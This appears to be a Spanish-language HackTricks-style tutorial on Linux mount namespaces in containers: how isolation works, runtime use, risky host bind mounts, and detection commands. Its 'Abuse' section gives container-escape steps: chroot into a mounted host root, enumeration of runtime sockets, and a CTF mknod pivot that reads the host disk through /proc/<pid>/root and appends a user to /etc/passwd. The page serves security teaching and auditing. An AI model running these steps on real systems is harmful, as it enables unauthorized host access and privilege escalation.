# Espacio de nombres de montajes

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres de montajes controla la **tabla de montajes** que ve un proceso. Esta es una de las características más importantes del aislamiento de contenedores, porque el sistema de archivos raíz, los montajes bind, los montajes tmpfs, la vista de procfs, la exposición de sysfs y muchos montajes auxiliares específicos del runtime se expresan mediante esa tabla de montajes. Dos procesos pueden acceder ambos a `/`, `/proc`, `/sys` o `/tmp`, pero aquello a lo que resuelven esas rutas depende del espacio de nombres de montajes en el que se encuentren.

Desde la perspectiva de la seguridad de contenedores, el espacio de nombres de montajes suele marcar la diferencia entre «este es un sistema de archivos de aplicación preparado de forma ordenada» y «este proceso puede ver o influir directamente en el sistema de archivos del host». Por eso los montajes bind, los volúmenes `hostPath`, las operaciones de montaje privilegiadas y las exposiciones modificables de `/proc` o `/sys` giran en torno a este espacio de nombres.

## Funcionamiento

Cuando un runtime inicia un contenedor, normalmente crea un espacio de nombres de montajes nuevo, prepara un sistema de archivos raíz para el contenedor, monta procfs y otros sistemas de archivos auxiliares según sea necesario y, después, añade opcionalmente montajes bind, montajes tmpfs, secretos, mapas de configuración o rutas del host. Una vez que el proceso se ejecuta dentro del espacio de nombres, el conjunto de montajes que ve está prácticamente desacoplado de la vista predeterminada del host. El host puede seguir viendo el sistema de archivos subyacente real, pero el contenedor ve la versión ensamblada para él por el runtime.

Esto es potente porque permite que el contenedor crea que tiene su propio sistema de archivos raíz, aunque el host siga gestionándolo todo. También es peligroso porque, si el runtime expone el montaje equivocado, el proceso obtiene de repente visibilidad sobre recursos del host que el resto del modelo de seguridad quizá no estaba diseñado para proteger.

## Lab

Puedes crear un espacio de nombres de montajes privado con:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si abres otra shell fuera de ese namespace e inspeccionas la tabla de montajes, verás que el montaje tmpfs existe únicamente dentro del namespace de montajes aislado. Este es un ejercicio útil porque demuestra que el aislamiento de montajes no es una teoría abstracta; el kernel literalmente presenta una tabla de montajes diferente al proceso.

Si abres otra shell fuera de ese namespace e inspeccionas la tabla de montajes, el montaje tmpfs existirá únicamente dentro del namespace de montajes aislado.

Dentro de los containers, una comparación rápida es:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
El segundo ejemplo demuestra lo fácil que es que una configuración del runtime abra un enorme agujero en el límite del filesystem.

## Uso del runtime

Docker, Podman, los stacks basados en containerd y CRI-O dependen de un mount namespace privado para los contenedores normales. Kubernetes se basa en el mismo mecanismo para los volúmenes, los secrets proyectados, los config maps y los mounts `hostPath`. Los entornos Incus/LXC también dependen en gran medida de los mount namespaces, especialmente porque los system containers suelen exponer filesystems más completos y parecidos a los de una máquina que los application containers.

Esto significa que, al revisar un problema relacionado con el filesystem de un contenedor, normalmente no estás observando una peculiaridad aislada de Docker. Estás observando un problema de mount namespace y de configuración del runtime expresado a través de la plataforma que inició el workload.

## Configuraciones incorrectas

El error más obvio y peligroso es exponer el filesystem raíz del host u otra ruta sensible del host mediante un bind mount, por ejemplo `-v /:/host` o un `hostPath` con permisos de escritura en Kubernetes. En ese punto, la pregunta ya no es "¿puede el contenedor escapar de alguna manera?", sino "¿cuánto contenido útil del host ya es directamente visible y modificable?". Un bind mount del host con permisos de escritura suele convertir el resto del exploit en una simple cuestión de colocar archivos, usar chroot, modificar la configuración o descubrir sockets del runtime.

Otro problema común es exponer `/proc` o `/sys` del host de formas que evitan la vista más segura del contenedor. Estos filesystems no son mounts de datos normales; son interfaces hacia el estado del kernel y de los procesos. Si el workload accede directamente a las versiones del host, muchas de las suposiciones en las que se basa el hardening de contenedores dejan de aplicarse correctamente.

Las protecciones de solo lectura también son importantes. Un filesystem raíz de solo lectura no protege mágicamente un contenedor, pero elimina una gran cantidad de espacio para staging del atacante y dificulta la persistencia, la colocación de helper binaries y la manipulación de la configuración. Por el contrario, una raíz con permisos de escritura o un bind mount del host con permisos de escritura proporciona al atacante espacio para preparar el siguiente paso.

## Abuse

Cuando el mount namespace se utiliza de forma incorrecta, los atacantes suelen hacer una de cuatro cosas. **Leen datos del host** que deberían haber permanecido fuera del contenedor. **Modifican la configuración del host** mediante bind mounts con permisos de escritura. **Montan o vuelven a montar recursos adicionales** si las capabilities y seccomp lo permiten. O **acceden a sockets con privilegios y a directorios de estado del runtime** que les permiten solicitar más acceso a la propia plataforma de contenedores.

Si el contenedor ya puede ver el filesystem del host, el resto del modelo de seguridad cambia inmediatamente.

Cuando sospeches que existe un bind mount del host, confirma primero qué está disponible y si tiene permisos de escritura:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si el sistema de archivos raíz del host está montado con permisos de lectura y escritura, el acceso directo al host suele ser tan sencillo como:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si el objetivo es obtener acceso privilegiado al runtime en lugar de hacer chroot directamente, enumera los sockets y el estado del runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` está presente, comprueba también si se pueden crear nuevos montajes desde dentro del contenedor:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Ejemplo completo: Pivot de `mknod` de dos shells

Una vía de abuso más especializada aparece cuando el usuario root del container puede crear dispositivos de bloque, el host y el container comparten una identidad de usuario de una forma útil y el atacante ya tiene un foothold de bajos privilegios en el host. En esa situación, el container puede crear un nodo de dispositivo como `/dev/sda`, y el usuario del host con pocos privilegios puede leerlo posteriormente a través de `/proc/<pid>/root/` para el proceso correspondiente del container.<sup>[[1]](#references)</sup>

Dentro del container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Desde el host, como el usuario correspondiente de bajos privilegios después de localizar el PID del shell del contenedor:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La lección importante no es la búsqueda exacta de la cadena del CTF. Es que la exposición del mount-namespace mediante `/proc/<pid>/root/` puede permitir que un usuario del host reutilice device nodes creados por el container, incluso cuando la cgroup device policy impedía su uso directo dentro del propio container.<sup>[[1]](#references)</sup>

## Comprobaciones

Estos comandos sirven para mostrar la vista del filesystem en la que realmente se está ejecutando el proceso actual. El objetivo es detectar mounts derivados del host, rutas sensibles con permisos de escritura y cualquier elemento que parezca más amplio que el root filesystem normal de un application container.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Qué es interesante aquí:

- Los bind mounts desde el host, especialmente `/`, `/proc`, `/sys`, los directorios de estado del runtime o las ubicaciones de sockets, deberían destacar inmediatamente.
- Los montajes inesperados de lectura-escritura suelen ser más importantes que un gran número de montajes auxiliares de solo lectura.
- `mountinfo` suele ser el mejor lugar para comprobar si una ruta realmente deriva del host o está respaldada por overlay.

Estas comprobaciones establecen **qué recursos son visibles en este espacio de nombres**, **cuáles derivan del host** y **cuáles son escribibles o sensibles desde el punto de vista de la seguridad**.

## Referencias

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
